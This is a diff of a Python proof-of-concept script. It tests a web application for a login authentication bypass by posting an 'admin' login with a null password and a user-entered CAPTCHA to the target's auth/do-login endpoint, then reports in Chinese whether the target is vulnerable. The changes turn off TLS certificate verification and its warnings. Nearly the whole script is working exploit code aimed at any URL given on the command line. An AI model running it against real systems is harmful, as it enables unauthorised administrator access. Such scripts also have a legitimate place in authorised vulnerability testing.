@@ -1,6 +1,7 @@
+import sys
 from selenium.webdriver import Chrome
 import requests
-import sys
+from requests.packages import urllib3
 url = sys.argv[1]
 
 
@@ -15,13 +16,15 @@ def bypass():
     }
     captcha = input("请输入当前验证码")
     data = 'args={"type":2,"username":"admin","password":null,"captcha":"' + captcha + '","oath":"","remember":false}'
-    resp_dict = requests.post(url=f'{url}auth/do-login', headers=headers, data=data).json()
+    urllib3.disable_warnings()
+    resp_dict = requests.post(url=f'{url}auth/do-login', headers=headers, data=data, verify=False).json()
     print(resp_dict)
     if resp_dict['code'] == 0:
         print(f'[+]存在登录认证绕过漏洞，{url}auth/login')
     else:
         print(f'[-]{url}不存在登录认证绕过漏洞')
     input("按任意键退出，窗口关闭！")
+    web.close()
 
 
 if __name__ == '__main__':
